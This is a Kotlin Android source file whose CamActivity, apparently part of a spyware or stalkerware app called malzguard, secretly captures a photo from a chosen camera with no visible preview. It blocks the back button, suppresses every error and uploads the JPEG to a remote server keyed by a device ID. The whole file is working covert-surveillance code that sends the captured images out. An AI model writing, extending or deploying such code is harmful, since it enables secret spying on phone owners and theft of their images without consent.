package com.example.malzguard

import android.app.Activity
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

class CamActivity : Activity() {
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private var finished = false

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        try {
            window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
            window.setDimAmount(0f)
            val facing = intent.getStringExtra("facing") ?: "back"
            thread = HandlerThread("cam").also { it.start() }
            handler = Handler(thread!!.looper)
            handler!!.post { capture(facing) }
            handler?.postDelayed({ finishSafe() }, 15000)
        } catch (e: Exception) { finishSafe() }
    }

    private fun finishSafe() {
        if (finished) return
        finished = true
        try { thread?.quitSafely() } catch (e: Exception) {}
        try { finish() } catch (e: Exception) {}
    }

    private fun capture(facing: String) {
        try {
            val cm = getSystemService(CAMERA_SERVICE) as CameraManager
            val camId = cm.cameraIdList.firstOrNull { cid ->
                val ch = cm.getCameraCharacteristics(cid)
                val f = ch.get(CameraCharacteristics.LENS_FACING)
                if (facing == "front") f == CameraCharacteristics.LENS_FACING_FRONT else f == CameraCharacteristics.LENS_FACING_BACK
            } ?: cm.cameraIdList.firstOrNull() ?: run { finishSafe(); return }
            val ch = cm.getCameraCharacteristics(camId)
            val sz = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)?.getOutputSizes(ImageReader::class.java)?.firstOrNull() ?: run { finishSafe(); return }
            val reader = ImageReader.newInstance(sz.width, sz.height, android.graphics.ImageFormat.JPEG, 1)
            reader.setOnImageAvailableListener({ r ->
                try {
                    val img = r.acquireLatestImage()
                    val buf = img?.planes?.get(0)?.buffer
                    if (buf != null) {
                        val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                        upload(bytes)
                    }
                    img?.close()
                } catch (e: Exception) {}
                try { r.close() } catch (e: Exception) {}
                finishSafe()
            }, handler)
            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    try {
                        cam.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(sess: CameraCaptureSession) {
                                try {
                                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    req.addTarget(reader.surface)
                                    sess.capture(req.build(), null, handler)
                                } catch (e: Exception) { finishSafe() }
                            }
                            override fun onConfigureFailed(sess: CameraCaptureSession) { finishSafe() }
                        }, handler)
                    } catch (e: Exception) { finishSafe() }
                }
                override fun onDisconnected(cam: CameraDevice) { try { cam.close() } catch (e: Exception) {}; finishSafe() }
                override fun onError(cam: CameraDevice, e: Int) { try { cam.close() } catch (e: Exception) {}; finishSafe() }
            }, handler)
        } catch (e: Exception) { finishSafe() }
    }

    private fun upload(bytes: ByteArray) {
        try {
            val sp = getSharedPreferences("mg", MODE_PRIVATE)
            val id = sp.getString("id", "") ?: ""
            val boundary = "----MG" + System.currentTimeMillis()
            val c = URL(Config.SERVER + "/api/upload/" + id + "/photo").openConnection() as HttpURLConnection
            c.connectTimeout = 15000; c.readTimeout = 30000; c.requestMethod = "POST"; c.doOutput = true
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            val os: OutputStream = c.outputStream
            os.write(("--$boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"cam_${System.currentTimeMillis()}.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n").toByteArray())
            os.write(bytes)
            os.write(("\r\n--$boundary--\r\n").toByteArray())
            os.flush()
            try { c.responseCode } catch (e: Exception) {}
            try { c.disconnect() } catch (e: Exception) {}
        } catch (e: Exception) {}
    }

    override fun onBackPressed() {}
}
